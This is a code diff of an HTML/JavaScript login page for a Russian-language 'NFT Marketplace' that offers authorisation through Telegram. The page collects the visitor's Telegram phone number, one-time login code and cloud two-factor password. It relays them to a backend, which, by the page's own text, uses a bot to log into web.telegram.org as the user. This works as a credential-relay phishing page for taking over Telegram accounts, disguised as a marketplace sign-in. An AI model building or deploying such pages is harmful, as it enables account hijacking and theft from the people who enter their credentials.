@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFT Marketplace - Авторизация Telegram</title>
+    <title>Авторизация через Telegram Web • NFT Маркетплейс</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -16,134 +16,188 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
         }
         
-        .container {
-            max-width: 400px;
+        .auth-container {
             width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            overflow: hidden;
         }
         
-        .auth-card {
-            background: white;
-            border-radius: 20px;
-            padding: 40px 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        .auth-header {
+            background: #0088cc;
+            color: white;
+            padding: 30px 20px;
             text-align: center;
         }
         
-        .logo {
-            font-size: 60px;
+        .auth-logo {
+            font-size: 48px;
             margin-bottom: 10px;
         }
         
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
+        .auth-title {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 5px;
         }
         
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 16px;
+        .auth-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
         }
         
-        .btn {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            background: #007bff;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: all 0.3s ease;
+        .auth-content {
+            padding: 30px 25px;
         }
         
-        .btn:hover {
-            background: #0056b3;
-            transform: translateY(-2px);
-        }
-        
-        .btn-telegram {
-            background: #0088cc;
-        }
-        
-        .btn-telegram:hover {
-            background: #006699;
-        }
-        
-        .btn-secondary {
-            background: #6c757d;
-        }
-        
-        .btn-secondary:hover {
-            background: #545b62;
-        }
-        
-        .hidden {
+        .step {
             display: none;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
+        .step.active {
+            display: block;
         }
         
-        .form-label {
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
             display: block;
             margin-bottom: 8px;
             font-weight: 500;
             color: #333;
+            font-size: 14px;
         }
         
-        .form-input {
+        .input-field {
             width: 100%;
             padding: 12px 15px;
-            border: 2px solid #e9ecef;
-            border-radius: 10px;
+            border: 2px solid #e1e5eb;
+            border-radius: 8px;
             font-size: 16px;
-            transition: border-color 0.3s ease;
+            transition: all 0.3s ease;
         }
         
-        .form-input:focus {
+        .input-field:focus {
             outline: none;
-            border-color: #007bff;
+            border-color: #0088cc;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn-primary {
+            background: #0088cc;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #006699;
+        }
+        
+        .btn-secondary {
+            background: #f8f9fa;
+            color: #333;
+            border: 2px solid #e1e5eb;
+        }
+        
+        .btn-secondary:hover {
+            background: #e9ecef;
         }
         
         .info-box {
             background: #e7f3ff;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin: 20px 0;
-            text-align: left;
-        }
-        
-        .info-box.warning {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
+            font-size: 14px;
+            color: #0066cc;
+            border-left: 4px solid #0088cc;
         }
         
         .info-box.success {
             background: #d4edda;
-            border-left: 4px solid #28a745;
+            color: #155724;
+            border-left-color: #28a745;
         }
         
-        .code-display {
+        .info-box.warning {
+            background: #fff3cd;
+            color: #856404;
+            border-left-color: #ffc107;
+        }
+        
+        .status-box {
             background: #f8f9fa;
             padding: 20px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin: 20px 0;
-            font-size: 28px;
-            font-weight: bold;
-            color: #28a745;
-            border: 2px dashed #28a745;
+            text-align: center;
+        }
+        
+        .status-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .user-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .user-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #0088cc;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 15px;
         }
         
         .step-indicator {
@@ -153,200 +207,175 @@
             gap: 10px;
         }
         
-        .step {
-            width: 35px;
-            height: 35px;
+        .step-dot {
+            width: 10px;
+            height: 10px;
             border-radius: 50%;
-            background: #e9ecef;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            color: #6c757d;
-            position: relative;
+            background: #e1e5eb;
+            transition: all 0.3s ease;
         }
         
-        .step.active {
-            background: #007bff;
-            color: white;
-        }
-        
-        .step.completed {
-            background: #28a745;
-            color: white;
-        }
-        
-        .step::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 100%;
-            width: 20px;
-            height: 2px;
-            background: #e9ecef;
-        }
-        
-        .step:last-child::after {
-            display: none;
-        }
-        
-        .user-info {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 12px;
-            margin: 20px 0;
-        }
-        
-        .telegram-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
+        .step-dot.active {
+            background: #0088cc;
+            transform: scale(1.2);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="auth-card">
-            <div class="logo">🎁</div>
-            <h1>NFT Маркетплейс</h1>
-            <p class="subtitle">Авторизация через Telegram</p>
-            
+    <div class="auth-container">
+        <!-- Header -->
+        <div class="auth-header">
+            <div class="auth-logo">🎁</div>
+            <div class="auth-title">NFT Маркетплейс</div>
+            <div class="auth-subtitle">Авторизация через Telegram Web</div>
+        </div>
+        
+        <!-- Content -->
+        <div class="auth-content">
             <!-- Step Indicator -->
             <div class="step-indicator">
-                <div class="step active" id="step1">1</div>
-                <div class="step" id="step2">2</div>
-                <div class="step" id="step3">3</div>
-                <div class="step" id="step4">4</div>
+                <div class="step-dot active" id="step1Dot"></div>
+                <div class="step-dot" id="step2Dot"></div>
+                <div class="step-dot" id="step3Dot"></div>
+                <div class="step-dot" id="step4Dot"></div>
             </div>
             
             <!-- Step 1: Phone Input -->
-            <div id="stepPhone" class="auth-step">
-                <div class="telegram-icon">📱</div>
+            <div id="stepPhone" class="step active">
                 <div class="info-box">
-                    <strong>Вход в аккаунт Telegram</strong>
-                    <p style="margin-top: 8px; font-size: 14px; color: #666;">
-                        Введите номер телефона, привязанный к вашему Telegram аккаунту
-                    </p>
+                    🤖 <strong>Бот авторизуется в Telegram Web</strong><br>
+                    Введите номер телефона для авторизации
                 </div>
-                <div class="form-group">
-                    <label class="form-label">Номер телефона Telegram</label>
-                    <input type="tel" id="phoneInput" class="form-input" 
-                           placeholder="+79123456789" required>
+                
+                <div class="input-group">
+                    <label class="input-label">Номер телефона Telegram</label>
+                    <input type="tel" id="phoneInput" class="input-field" 
+                           placeholder="+7 912 345-67-89" required>
                 </div>
-                <button class="btn btn-telegram" onclick="initTelegramAuth()">
-                    Получить код в Telegram
+                
+                <button class="btn btn-primary" onclick="initTelegramWebAuth()">
+                    Начать авторизацию
                 </button>
             </div>
             
-            <!-- Step 2: Code Verification -->
-            <div id="stepCode" class="auth-step hidden">
-                <div class="info-box success">
-                    <strong>Код отправлен в Telegram</strong>
-                    <p style="margin-top: 8px; font-size: 14px;">
-                        Проверьте код в официальном приложении Telegram
-                    </p>
+            <!-- Step 2: Browser Automation -->
+            <div id="stepBrowser" class="step">
+                <div class="status-box">
+                    <div class="status-icon">🌐</div>
+                    <h3>Запуск Telegram Web</h3>
+                    <p>Бот открывает web.telegram.org и вводит ваш номер...</p>
                 </div>
-                <div class="form-group">
-                    <label class="form-label">Код из Telegram</label>
-                    <input type="text" id="codeInput" class="form-input" 
-                           placeholder="123456" maxlength="6" required>
+                
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p id="browserStatus">Инициализация браузера...</p>
                 </div>
-                <div class="form-group">
-                    <label class="form-label">Облачный пароль Telegram</label>
-                    <input type="password" id="cloudPasswordInput" class="form-input" 
-                           placeholder="Введите, если установлен">
-                    <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
-                        Защита вашего аккаунта в облаке
-                    </small>
-                </div>
-                <button class="btn btn-telegram" onclick="verifyTelegramCode()">
-                    Подтвердить код
-                </button>
+                
                 <button class="btn btn-secondary" onclick="backToPhone()">
                     Назад
                 </button>
             </div>
             
-            <!-- Step 3: Phone Access Request -->
-            <div id="stepAccess" class="auth-step hidden">
-                <div class="info-box">
-                    <strong>Доступ к номеру телефона</strong>
-                    <p style="margin-top: 8px; font-size: 14px; color: #666;">
-                        Для завершения авторизации предоставьте доступ к номеру телефона
-                    </p>
+            <!-- Step 3: Code Input -->
+            <div id="stepCode" class="step">
+                <div class="info-box success">
+                    ✅ Номер введен в Telegram Web<br>
+                    📱 Код отправлен в ваш Telegram аккаунт
                 </div>
-                <button class="btn btn-telegram" onclick="requestPhoneAccess()">
-                    Предоставить доступ в Telegram
+                
+                <div class="input-group">
+                    <label class="input-label">Код из Telegram</label>
+                    <input type="text" id="codeInput" class="input-field" 
+                           placeholder="12345" maxlength="5" required>
+                </div>
+                
+                <button class="btn btn-primary" onclick="submitCode()">
+                    Отправить код
                 </button>
-                <div class="info-box warning" style="margin-top: 15px;">
-                    <small>
-                        Боту требуется доступ для подтверждения вашего аккаунта Telegram
-                    </small>
-                </div>
+                <button class="btn btn-secondary" onclick="backToBrowser()">
+                    Назад
+                </button>
             </div>
             
-            <!-- Step 4: Success -->
-            <div id="stepSuccess" class="auth-step hidden">
-                <div class="info-box success">
-                    <strong>✅ Авторизация успешна!</strong>
+            <!-- Step 4: Password Input -->
+            <div id="stepPassword" class="step">
+                <div class="info-box">
+                    🔐 Требуется облачный пароль<br>
+                    Введите пароль для завершения авторизации
                 </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Облачный пароль</label>
+                    <input type="password" id="passwordInput" class="input-field" 
+                           placeholder="Необязательно">
+                </div>
+                
+                <button class="btn btn-primary" onclick="submitPassword()">
+                    Завершить авторизацию
+                </button>
+                <button class="btn btn-secondary" onclick="backToCode()">
+                    Назад
+                </button>
+            </div>
+            
+            <!-- Step 5: Success -->
+            <div id="stepSuccess" class="step">
+                <div class="info-box success">
+                    ✅ Авторизация завершена успешно!
+                </div>
+                
                 <div class="user-info">
+                    <div class="user-avatar">👤</div>
                     <div id="userDetails">
-                        Загрузка информации...
+                        Добро пожаловать в ваш аккаунт Telegram!
                     </div>
                 </div>
-                <button class="btn btn-telegram" onclick="enterMarketplace()">
-                    Войти в маркетплейс
+                
+                <button class="btn btn-primary" onclick="enterMarketplace()">
+                    Перейти в маркетплейс
                 </button>
-            </div>
-            
-            <!-- Demo Code Display (for testing) -->
-            <div id="demoCode" class="code-display hidden">
-                Тестовый код: <span id="demoCodeValue"></span>
             </div>
         </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        let currentAuthSessionId = null;
-        let currentSessionId = null;
+        let currentAuthSessionId = '';
+        let currentSessionId = '';
         let currentUser = null;
         
-        // Initialize Telegram Web App
-        tg.expand();
-        tg.enableClosingConfirmation();
-        
-        // Update step indicator
-        function updateStepIndicator(step) {
-            document.querySelectorAll('.step').forEach((s, index) => {
-                s.classList.remove('active', 'completed');
-                if (index + 1 < step) {
-                    s.classList.add('completed');
-                } else if (index + 1 === step) {
-                    s.classList.add('active');
+        // Show specific step
+        function showStep(stepName) {
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById(`step${stepName}`).classList.add('active');
+            
+            // Update step indicator
+            const steps = ['Phone', 'Browser', 'Code', 'Password', 'Success'];
+            const stepIndex = steps.indexOf(stepName);
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                if (index <= stepIndex) {
+                    dot.classList.add('active');
+                } else {
+                    dot.classList.remove('active');
                 }
             });
         }
         
-        // Show specific step
-        function showStep(stepName) {
-            document.querySelectorAll('.auth-step').forEach(step => {
-                step.classList.add('hidden');
-            });
-            document.getElementById(`step${stepName}`).classList.remove('hidden');
-        }
-        
-        // Step 1: Initiate Telegram authentication
-        async function initTelegramAuth() {
+        // Step 1: Initiate Telegram Web auth
+        async function initTelegramWebAuth() {
             const phone = document.getElementById('phoneInput').value.trim();
             
             if (!phone) {
-                alert('Введите номер телефона Telegram');
+                alert('Введите номер телефона');
                 return;
             }
             
+            showStep('Browser');
+            
             try {
-                const response = await fetch('/api/auth/init-telegram', {
+                // Step 1: Create auth session
+                const response1 = await fetch('/api/auth/init-telegram-web', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -354,28 +383,44 @@
                     body: JSON.stringify({ phone })
                 });
                 
-                const data = await response.json();
+                const data1 = await response1.json();
                 
-                if (data.success) {
-                    currentAuthSessionId = data.authSessionId;
-                    updateStepIndicator(2);
-                    showStep('Code');
+                if (data1.success) {
+                    currentAuthSessionId = data1.authSessionId;
                     
-                    // Show demo code for testing (remove in production)
-                    document.getElementById('demoCodeValue').textContent = data.code;
-                    document.getElementById('demoCode').classList.remove('hidden');
+                    // Step 2: Start browser automation
+                    document.getElementById('browserStatus').textContent = 'Запуск браузера...';
+                    
+                    const response2 = await fetch('/api/auth/start-telegram-web-auth', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ authSessionId: currentAuthSessionId })
+                    });
+                    
+                    const data2 = await response2.json();
+                    
+                    if (data2.success) {
+                        document.getElementById('browserStatus').textContent = 'Ожидание кода...';
+                        setTimeout(() => {
+                            showStep('Code');
+                        }, 2000);
+                    } else {
+                        throw new Error(data2.error);
+                    }
                 } else {
-                    alert('Ошибка: ' + data.error);
+                    throw new Error(data1.error);
                 }
             } catch (error) {
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка: ' + error.message);
+                showStep('Phone');
             }
         }
         
-        // Step 2: Verify Telegram code
-        async function verifyTelegramCode() {
+        // Step 3: Submit code
+        async function submitCode() {
             const code = document.getElementById('codeInput').value.trim();
-            const cloudPassword = document.getElementById('cloudPasswordInput').value;
             
             if (!code) {
                 alert('Введите код из Telegram');
@@ -383,46 +428,46 @@
             }
             
             try {
-                const response = await fetch('/api/auth/verify-telegram-code', {
+                const response = await fetch('/api/auth/submit-telegram-code', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({ 
                         authSessionId: currentAuthSessionId,
-                        code: code,
-                        cloudPassword: cloudPassword
+                        code: code
                     })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    updateStepIndicator(3);
-                    showStep('Access');
-                    document.getElementById('demoCode').classList.add('hidden');
+                    if (data.nextStep === 'enter_password') {
+                        showStep('Password');
+                    } else if (data.nextStep === 'complete') {
+                        await completeAuth();
+                    }
                 } else {
                     alert('Ошибка: ' + data.error);
                 }
             } catch (error) {
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка: ' + error.message);
             }
         }
         
-        // Step 3: Request phone access in Telegram
-        async function requestPhoneAccess() {
+        // Step 4: Submit password
+        async function submitPassword() {
+            const password = document.getElementById('passwordInput').value;
+            
             try {
-                // Use Telegram Web App to request phone access
-                const initData = tg.initData; // Telegram Web App initialization data
-                
-                const response = await fetch('/api/auth/finalize-telegram', {
+                const response = await fetch('/api/auth/submit-telegram-password', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({ 
                         authSessionId: currentAuthSessionId,
-                        initData: initData
+                        password: password
                     })
                 });
                 
@@ -431,72 +476,134 @@
                 if (data.success) {
                     currentSessionId = data.sessionId;
                     currentUser = data.user;
-                    updateStepIndicator(4);
-                    showStep('Success');
                     
-                    // Display user info
+                    // Save session
+                    localStorage.setItem('nft_session', currentSessionId);
+                    localStorage.setItem('nft_user', JSON.stringify(currentUser));
+                    
+                    // Show user info
                     document.getElementById('userDetails').innerHTML = `
-                        <strong>Аккаунт Telegram:</strong><br>
-                        👤 ${currentUser.firstName} ${currentUser.lastName || ''}<br>
+                        <strong>Аккаунт Telegram</strong><br>
                         📱 ${currentUser.phone}<br>
-                        🆔 ${currentUser.username ? '@' + currentUser.username : 'Без username'}
+                        👤 ${currentUser.firstName} ${currentUser.lastName}<br>
+                        🆔 ${currentUser.telegramId}
                     `;
+                    
+                    showStep('Success');
                 } else {
                     alert('Ошибка: ' + data.error);
                 }
             } catch (error) {
-                alert('Ошибка соединения: ' + error.message);
+                alert('Ошибка: ' + error.message);
             }
         }
         
-        // Back to phone step
-        function backToPhone() {
-            updateStepIndicator(1);
-            showStep('Phone');
-            document.getElementById('demoCode').classList.add('hidden');
+        // Complete auth without password
+        async function completeAuth() {
+            try {
+                const response = await fetch('/api/auth/submit-telegram-password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        authSessionId: currentAuthSessionId,
+                        password: ''
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentSessionId = data.sessionId;
+                    currentUser = data.user;
+                    
+                    localStorage.setItem('nft_session', currentSessionId);
+                    localStorage.setItem('nft_user', JSON.stringify(currentUser));
+                    
+                    document.getElementById('userDetails').innerHTML = `
+                        <strong>Аккаунт Telegram</strong><br>
+                        📱 ${currentUser.phone}<br>
+                        👤 ${currentUser.firstName} ${currentUser.lastName}<br>
+                        🆔 ${currentUser.telegramId}
+                    `;
+                    
+                    showStep('Success');
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (error) {
+                alert('Ошибка: ' + error.message);
+            }
         }
         
-        // Enter marketplace
+        // Navigation
+        function backToPhone() {
+            showStep('Phone');
+        }
+        
+        function backToBrowser() {
+            showStep('Browser');
+        }
+        
+        function backToCode() {
+            showStep('Code');
+        }
+        
         function enterMarketplace() {
             if (currentSessionId) {
-                localStorage.setItem('nft_session', currentSessionId);
                 window.location.href = '/marketplace';
-            } else {
-                alert('Сессия не найдена');
             }
         }
         
-        // Check existing session on page load
+        // Check existing session
         async function checkExistingSession() {
             const savedSession = localStorage.getItem('nft_session');
-            if (savedSession) {
+            const savedUser = localStorage.getItem('nft_user');
+            
+            if (savedSession && savedUser) {
                 try {
                     const response = await fetch(`/api/auth/verify-session?sessionId=${savedSession}`);
                     const data = await response.json();
                     
                     if (data.success) {
                         currentSessionId = savedSession;
-                        currentUser = data.user;
-                        updateStepIndicator(4);
-                        showStep('Success');
+                        currentUser = JSON.parse(savedUser);
                         
                         document.getElementById('userDetails').innerHTML = `
-                            <strong>Аккаунт Telegram:</strong><br>
-                            👤 ${currentUser.firstName} ${currentUser.lastName || ''}<br>
+                            <strong>Аккаунт Telegram</strong><br>
                             📱 ${currentUser.phone}<br>
-                            🆔 ${currentUser.username ? '@' + currentUser.username : 'Без username'}
+                            👤 ${currentUser.firstName} ${currentUser.lastName}<br>
+                            🆔 ${currentUser.telegramId}
                         `;
+                        
+                        showStep('Success');
                     } else {
                         localStorage.removeItem('nft_session');
+                        localStorage.removeItem('nft_user');
                     }
                 } catch (error) {
                     localStorage.removeItem('nft_session');
+                    localStorage.removeItem('nft_user');
                 }
             }
         }
         
         // Initialize
         checkExistingSession();
+        
+        // Enter handlers
+        document.getElementById('codeInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitCode();
+            }
+        });
+        
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitPassword();
+            }
+        });
     </script>
 </body>
 </html>
